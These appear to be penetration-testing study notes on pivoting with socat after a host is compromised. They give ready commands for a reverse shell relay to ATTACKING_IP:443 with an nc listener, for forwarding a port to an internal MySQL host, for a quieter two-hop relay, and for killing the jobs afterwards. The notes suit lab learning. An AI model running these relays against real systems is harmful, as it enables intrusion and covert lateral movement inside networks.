- Upload a static binary of socat
- Reverse shell relay: `./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`
	- Relays anything that connects to port 8000 of the compromised pivot machine back to our machine as a shell
	- Attacking ip:443 is our ip and 443 is our port with `nc -nlvp 443`
- Port forwarding: `./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`
	- Opens up port 33060 on compromised server, redirects connects from remote server 172.16.0.10:3306 to our computer
	- Send data to port 33060 on relay 172.16.0.5 and have connection automatically relay to remote
- Quiet port forwarding:
	- Our machine: `socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
	- Relay machine: `./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`
	- View port 8000 on server, data relayed from our port 8001 to remote relay then to remote service
- Close socat tasks: `jobs` then `kill %NUMBER` like `kill %1`
